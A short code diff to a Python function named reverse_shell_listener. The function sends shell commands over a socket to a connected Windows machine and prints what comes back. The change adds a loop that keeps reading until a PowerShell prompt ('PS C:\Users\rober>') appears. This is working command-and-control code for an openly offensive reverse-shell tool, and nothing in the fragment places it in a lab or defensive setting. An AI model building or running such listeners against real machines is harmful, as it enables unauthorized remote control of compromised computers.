@@ -30,6 +30,8 @@ def reverse_shell_listener():
 			print("Sending: " + line)
 			conn.send(bytes(line + "\n\r", "UTF-8")) # Send shell command.
 			data = conn.recv(4096).decode("UTF-8") # Receive output from command.
+			while("PS C:\\Users\\rober>" not in data):
+				data = conn.recv(4096).decode("UTF-8") # Receive output from command.
 			print(data) # Print the output of the command.
 	except KeyboardInterrupt: 
 		print("...listener terminated using [ctrl+c], Shutting down!")
